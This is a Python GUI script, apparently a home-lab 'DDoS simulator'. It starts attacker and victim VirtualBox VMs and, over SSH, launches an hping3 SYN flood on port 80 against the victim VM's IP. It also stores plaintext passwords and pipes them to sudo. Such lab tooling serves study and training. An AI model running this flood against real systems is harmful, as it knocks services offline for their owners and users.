import subprocess
import time
import threading
import os
import tkinter as tk
from tkinter import scrolledtext

def get_vm_ip(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE).decode().strip()
        if result.startswith("Value:"):
            return result.split(":")[1].strip()
        else:
            return "IP not found"
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"

# VM Configuration
vm_attacker = "kali-linux-2024.3-virtualbox-amd64"
attacker_user = "kali"
attacker_pass = "kali"

vm_victim = "ubuntuDesktop"
victim_user = "Shields"
victim_pass = "1234"

attacker_ip_command = f"VBoxManage guestproperty get {vm_attacker} /VirtualBox/GuestInfo/Net/0/V4/IP"
victim_ip_command = f"VBoxManage guestproperty get {vm_victim} /VirtualBox/GuestInfo/Net/0/V4/IP"

attacker_ip = get_vm_ip(attacker_ip_command)
victim_ip = get_vm_ip(victim_ip_command)

print(f"Attacker IP: {attacker_ip}")
print(f"Victim IP: {victim_ip}")

def log_message(msg):
    log_text.insert(tk.END, msg + "\n")
    log_text.see(tk.END)

# Start VMs
def start_vms():
    log_message("Starting VMs...")
    subprocess.run(["VBoxManage", "startvm", vm_attacker, "--type", "headless"])
    subprocess.run(["VBoxManage", "startvm", vm_victim, "--type", "headless"])
    log_message("VMs started. Waiting for boot...")
    time.sleep(120)  # Wait for OS to boot
    log_message("VMs are ready.")

# Stop VMs
def stop_vms():
    log_message("Stopping VMs...")
    subprocess.run(["VBoxManage", "controlvm", vm_attacker, "acpipowerbutton"])
    subprocess.run(["VBoxManage", "controlvm", vm_victim, "acpipowerbutton"])
    log_message("VMs are shutting down...")

# Start Attack
def start_attack():
    log_message("Launching attack via SSH...")
    attack_command = f"ssh {attacker_user}@{attacker_ip} 'echo {attacker_pass} | sudo hping3 -S --flood -p 80 {victim_ip}'"
    
    try:
        result = subprocess.run(attack_command, shell=True, capture_output=True, text=True)
        log_message(f"Attacking {victim_ip} from {attacker_ip}...\n{result.stdout}")
        if result.stderr:
            log_message(f"Error: {result.stderr}")
    except Exception as e:
        log_message(f"Error launching attack: {e}")

# Stop Attack
def stop_attack():
    log_message("Stopping attack...")
    stop_command = f"ssh {attacker_user}@{attacker_ip} 'echo {attacker_pass} | sudo -S pkill hping3'"
    
    try:
        result = subprocess.run(stop_command, shell=True, capture_output=True, text=True)
        log_message("Attack stopped.\n" + result.stdout)
        if result.stderr:
            log_message(f"Error: {result.stderr}")
    except Exception as e:
        log_message(f"Error stopping attack: {e}")

# Monitor Victim
def monitor_victim():
    log_message("Monitoring victim VM...")
    monitor_command = f"ssh {victim_user}@{victim_ip} 'netstat -antp | grep ESTABLISHED'"
    
    try:
        result = subprocess.run(monitor_command, shell=True, capture_output=True, text=True)
        log_message("Victim's active connections:\n" + result.stdout)
        if result.stderr:
            log_message(f"Error: {result.stderr}")
    except Exception as e:
        log_message(f"Error monitoring victim: {e}")

# GUI Setup
root = tk.Tk()
root.title("VM DDoS Simulator")

frame = tk.Frame(root)
frame.pack(pady=20)

btn_start_vms = tk.Button(frame, text="Start VMs", command=lambda: threading.Thread(target=start_vms).start())
btn_stop_vms = tk.Button(frame, text="Stop VMs", command=lambda: threading.Thread(target=stop_vms).start())
btn_start_attack = tk.Button(frame, text="Start Attack", command=lambda: threading.Thread(target=start_attack).start())
btn_stop_attack = tk.Button(frame, text="Stop Attack", command=lambda: threading.Thread(target=stop_attack).start())
btn_monitor = tk.Button(frame, text="Monitor Victim", command=lambda: threading.Thread(target=monitor_victim).start())

btn_start_vms.grid(row=0, column=0, padx=5)
btn_stop_vms.grid(row=0, column=1, padx=5)
btn_start_attack.grid(row=0, column=2, padx=5)
btn_stop_attack.grid(row=0, column=3, padx=5)
btn_monitor.grid(row=0, column=4, padx=5)

log_text = scrolledtext.ScrolledText(root, width=60, height=20)
log_text.pack(pady=10)

root.mainloop()
